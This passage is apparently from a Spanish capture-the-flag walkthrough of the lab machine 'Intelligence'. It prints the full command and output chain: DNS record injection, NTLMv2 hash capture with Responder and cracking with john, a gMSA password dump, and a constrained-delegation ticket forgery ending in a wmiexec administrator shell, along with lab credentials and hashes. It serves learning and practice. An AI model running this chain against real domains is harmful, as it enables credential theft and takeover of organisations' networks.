SMB         10.129.95.154   445    DC               IT              READ            
SMB         10.129.95.154   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.95.154   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.95.154   445    DC               Users           READ            
```

Nos `descargamos` el `archivo`

```
# smbclient -U 'Tiffany.Molina%NewIntelligenceCorpUser9876' //10.129.95.154/IT
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Apr 19 02:50:55 2021
  ..                                  D        0  Mon Apr 19 02:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 02:50:55 2021

		3770367 blocks of size 4096. 1354706 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (5.7 KiloBytes/sec) (average 5.7 KiloBytes/sec)
smb: \> exit
```

Leemos el `contenido del archivo`, lo que está haciendo el `script` es autenticarse contra un `DNS record` que tenga en su nombre la palabra `web` al principio

```
# cat downdetector.ps1 
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

## Abusing DNS

Si inyectamos un `DNS record` que apunte hacia nuestra `IP`, podemos capturar las `credenciales` que se envían. Para ello, lo primero es clonarnos este `repositorio` [https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx) y posteriormente inyectar un `DNS record` que apunte a nuestro `equipo`

```
# python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -a add -t A -r web-pwned -d 10.10.16.17 10.129.95.154    
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Nos ponemos en `escucha` con el `responder` y obtenemos el `hash NTLMV2` del usuario `Ted.Graves`

```
# sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.17]
    Responder IPv6             [dead:beef:4::100f]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-N76EZJID1GA]
    Responder Domain Name      [GTIZ.LOCAL]
    Responder DCE-RPC Port     [48929]

[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.129.95.154
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:3b8c82dfd86e7739:2D03CFBE3D6B5CF59ABD96584DDFBB5F:0101000000000000B5D60C28C804DB01CEEBC0A61293423D00000000020008004700540049005A0001001E00570049004E002D004E003700360045005A004A0049004400310047004100040014004700540049005A002E004C004F00430041004C0003003400570049004E002D004E003700360045005A004A00490044003100470041002E004700540049005A002E004C004F00430041004C00050014004700540049005A002E004C004F00430041004C00080030003000000000000000000000000020000073987153E985A7A5315E3E13B8BED9342F203B285AA53562C4146EA07ED8D2780A0010000000000000000000000000000000000009003E0048005400540050002F007700650062002D00700077006E00650064002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Rompemos el `hash NTLMV2` obteniendo la `contraseña`

```
# john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)     
1g 0:00:00:03 DONE (2024-09-11 23:01) 0.2949g/s 3191Kp/s 3191Kc/s 3191KC/s Mrz.deltasigma..MondayMan7
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

## Privilege Escalation

Como no tenemos acceso a la `máquina víctima`, vamos a usar `bloodhound-python`. Si nos da problemas, podemos eliminar la opción del `archivo ZIP` e importar todos los `JSON`

```
# bloodhound-python -c All -u 'Ted.Graves' -p 'Mr.Teddy' -ns 10.129.184.126 -d intelligence.htb -v --zip 
```

Ejecutamos `neo4j` para proceder a una `enumeración` más `profunda` del `directorio activo`

```
# sudo neo4j console
```

Nos dirigimos a `http://localhost:7474` y `rellenamos` los `datos` con las credenciales `neo4j:neo4j`

![](/assets/img/Intelligence/image_3.png)

`Introducimos` una `contraseña`

![](/assets/img/Intelligence/image_4.png)

Nos `abrimos` el `bloodhound` y nos `logueamos`

![](/assets/img/Intelligence/image_5.png)

Pinchamos en `Upload Data` y subimos el archivo .zip

![](/assets/img/Intelligence/image_6.png)

Si todo ha funcionado `correctamente` debería de verse así

![](/assets/img/Intelligence/image_7.png)

Pinchamos en `Find Shortest Paths to Domain Admins`

![](/assets/img/Intelligence/image_8.png)

Vemos que existe una forma de convertirnos en el usuario `svc_int$`

![](/assets/img/Intelligence/image_9.png)

Podemos leer la contraseña del `Group Managed Service Account`

![](/assets/img/Intelligence/image_10.png)

Lo primero que debemos hacer es clonarnos el `repositorio` [https://github.com/micahvandeusen/gMSADumper](https://github.com/micahvandeusen/gMSADumper) y ejecutar el siguiente `comando` para `dumpear` la `contraseña`

```
# python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::80d4ea8c2d5ccfd1ebac5bd732ece5e4
svc_int$:aes256-cts-hmac-sha1-96:aa7dad03df7672cf9c6fb9abafd90b0aa47a00dcf7e61ab68e7b2f62c21de85a
svc_int$:aes128-cts-hmac-sha1-96:c28e946a25e1dcb0d6552399baf0cbbe
```

Ahora que tenemos el `hash NT` del usuario `svc_int$`, podemos ganar acceso al `domain controller` como el usuario `Administrator` abusando del `AllowedToDelegate`

![](/assets/img/Intelligence/image_11.png)

Vamos a ejecutar un `Constrained Delegation Attack` para ganar acceso como el usuario `root`

![](/assets/img/Intelligence/image_12.png)

El ataque lo tenemos que realizar sobre un `SPN`. Debido a que no sabemos cuáles existen en la `máquina víctima`, los obtenemos usando `pywerview`. En este caso, para el usuario `svc_int`, el `SPN` es `WWW/dc.intelligence.htb`

```
# pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.129.184.126 --full-data
objectclass:                    top, person, organizationalPerson, user, computer, msDS-GroupManagedServiceAccount
cn:                             svc_int
distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
instancetype:                   4
whencreated:                    2021-04-19 00:49:58+00:00
whenchanged:                    2024-09-12 04:36:30+00:00
usncreated:                     12846
usnchanged:                     110740
name:                           svc_int
objectguid:                     {f180a079-f326-49b2-84a1-34824208d642}
useraccountcontrol:             WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
badpwdcount:                    0
codepage:                       0
countrycode:                    0
badpasswordtime:                2024-09-12 04:56:49.901056+00:00
lastlogoff:                     1601-01-01 00:00:00+00:00
lastlogon:                      2024-09-12 05:13:40.932301+00:00
localpolicyflags:               0
pwdlastset:                     2024-09-12 04:33:15.119793+00:00
primarygroupid:                 515
objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
accountexpires:                 9999-12-31 23:59:59.999999+00:00
logoncount:                     5
samaccountname:                 svc_int$
samaccounttype:                 805306369
dnshostname:                    svc_int.intelligence.htb
objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
iscriticalsystemobject:         False
dscorepropagationdata:          1601-01-01 00:00:00+00:00
lastlogontimestamp:             2024-09-12 04:36:30.947947+00:00
msds-allowedtodelegateto:       WWW/dc.intelligence.htb
msds-supportedencryptiontypes:  28
msds-managedpasswordid:         010000004b44534b020000006a010000150000001000000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordpreviousid: 010000004b44534b020000006a010000130000000800000059ae9d4f448f56bf92a5f4082ed6b61100000000220000002200...
msds-managedpasswordinterval:   30
msds-groupmsamembership:        010004801400000000000000000000002400000001020000000000052000000020020000040050000200000000002400ff01... 

objectclass:                   top, person, organizationalPerson, user, computer
cn:                            DC
usercertificate:               308205fb308204e3a00302010202137100000002cc9c8450ce507e1c000000000002300d06092a864886f70d01010b050...
distinguishedname:             CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
instancetype:                  4
whencreated:                   2021-04-19 00:42:41+00:00
whenchanged:                   2024-09-12 04:07:56+00:00
displayname:                   DC$
usncreated:                    12293
memberof:                      CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=intelligence,DC=htb, 
                               CN=Cert Publishers,CN=Users,DC=intelligence,DC=htb
usnchanged:                    110631
name:                          DC
objectguid:                    {f28de281-fd79-40c5-a77b-1252b80550ed}
useraccountcontrol:            SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
badpwdcount:                   0
codepage:                      0
countrycode:                   0
badpasswordtime:               1601-01-01 00:00:00+00:00
lastlogoff:                    1601-01-01 00:00:00+00:00
lastlogon:                     2024-09-12 04:18:07.073421+00:00
localpolicyflags:              0
pwdlastset:                    2024-09-12 04:07:33.510921+00:00
primarygroupid:                516
objectsid:                     S-1-5-21-4210132550-3389855604-3437519686-1000
accountexpires:                9999-12-31 23:59:59.999999+00:00
logoncount:                    354
samaccountname:                DC$
samaccounttype:                805306369
operatingsystem:               Windows Server 2019 Datacenter
operatingsystemversion:        10.0 (17763)
serverreferencebl:             CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intelligence,DC=htb
dnshostname:                   dc.intelligence.htb
ridsetreferences:              CN=RID Set,CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
serviceprincipalname:          ldap/DC/intelligence, HOST/DC/intelligence, RestrictedKrbHost/DC, HOST/DC, ldap/DC, 
                               Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/ForestDnsZones.intelligence.htb, 
                               ldap/dc.intelligence.htb/DomainDnsZones.intelligence.htb, DNS/dc.intelligence.htb, 
                               GC/dc.intelligence.htb/intelligence.htb, RestrictedKrbHost/dc.intelligence.htb, 
                               RPC/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence, HOST/dc.intelligence.htb, 
                               HOST/dc.intelligence.htb/intelligence.htb, 
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/195d59db-c263-4e51-b00b-4d6ce30136ea/intelligence.htb, 
                               ldap/195d59db-c263-4e51-b00b-4d6ce30136ea._msdcs.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence, ldap/dc.intelligence.htb, 
                               ldap/dc.intelligence.htb/intelligence.htb
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
iscriticalsystemobject:        True
dscorepropagationdata:         2021-04-19 00:42:42+00:00, 1601-01-01 00:00:01+00:00
lastlogontimestamp:            2024-09-12 04:07:56.885923+00:00
msds-supportedencryptiontypes: 28
msds-generationid:             04dbe18009b56e11...
msdfsr-computerreferencebl:    CN=DC,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=intelligence,DC=htb 
```

Al ejecutar el ataque nos puede dar el error `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`. Para solucionar el error, he seguido los pasos de este `artículo` [https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069)

```
# su root
# timedatectl set-ntp off
# rdate -n http://10.129.184.126/
```

Ejecutamos el `comando` nuevamente y funciona `correctamente`

```
# impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator' -altservice 'cifs' -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4   "intelligence.htb"/"svc_int$" 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from WWW/dc.intelligence.htb@INTELLIGENCE.HTB to cifs/dc.intelligence.htb@INTELLIGENCE.HTB
[*] Saving ticket in administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

Necesitamos `añadir` esta `variable` de `entorno`

```
# export KRB5CCNAME=`pwd`/administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

A continuación `ejecutamos` el comando `klist`, si no lo tenemos instalado podemos hacer `sudo apt install krb5-user`

```
# klist
Ticket cache: FILE:/home/justice-reaper/Desktop/Intelligence/exploits/gMSADumper/administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
Default principal: administrator@intelligence.htb

Valid starting     Expires            Service principal
09/12/24 07:30:19  09/12/24 17:30:19  cifs/dc.intelligence.htb@INTELLIGENCE.HTB
	renew until 09/13/24 07:30:18
```

Nos `conectamos` usando `wmiexec`

```
# impacket-wmiexec -k dc.intelligence.htb 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
intelligence\administrator
```
